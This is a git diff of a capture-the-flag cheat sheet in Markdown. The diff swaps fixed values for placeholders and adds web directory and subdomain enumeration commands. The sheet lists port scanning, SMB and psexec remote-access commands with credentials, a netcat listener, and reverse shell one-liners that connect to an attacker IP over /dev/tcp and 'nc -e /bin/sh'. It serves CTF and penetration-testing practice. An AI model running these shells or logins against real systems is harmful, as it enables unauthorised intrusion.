@@ -12,15 +12,15 @@ title: CTF Cheat Sheet
 # PortScan
 
 ```bash
-$ sudo rustscan -a <hostname> -- -sCV -oA <filename>
+$ sudo rustscan -a <target> -- -sCV -oA <filename>
 ```
 
 # SMB
 
 ```bash
-$ smbclient -L //server -U username%password
+$ smbclient -L //<target> -U <username>%<password>
 
-$ smbclient //server/share -U username%password
+$ smbclient //<target>/<share> -U <username>%<password>
 ```
 
 # BloodHound
@@ -38,19 +38,37 @@ $ rusthound-ce --domain <domain_name> -u <username> -p <password>
 # Remote Access
 
 ```bash
-$ impacket-psexec <domain_name>/<username>:'<password>'@<target_ip>
+$ impacket-psexec <domain_name>/<username>:'<password>'@<target>
 ```
 
 # Web Server
 
 ```bash
-$ python3 -m http.server 8080 -d directory
+$ python3 -m http.server <8080:port> -d <directory>
+```
+
+# Web Enumeration
+
+## Files or Directorues
+```bash
+dirsearch -u http://<target>
+
+gobuster dir -u http://<target> -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html
+
+dirb http://<target>
+
+ffuf -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php
+```
+
+## Vhosts or SubDomains
+```bash
+ffuf -u <url> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -fs <size>
 ```
 
 # Listener
 
 ```bash
-rlwrap nc -nvlp 1337
+rlwrap nc -nvlp <8080:port>
 
 rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
 ```
@@ -58,9 +76,15 @@ rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L
 # Reverse Shell
 
 ```bash
-'bash -c "bash -i >& /dev/tcp/1.2.3.4/1337 0>&1"'
+'bash -c "bash -i >& /dev/tcp/<attachet_ip>/<8080:port> 0>&1"'
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh <attacker_ip> <8080:port>
+```
+
+# Walkthroughs
+
+```bash
+https://0xdf.gitlab.io/
 ```
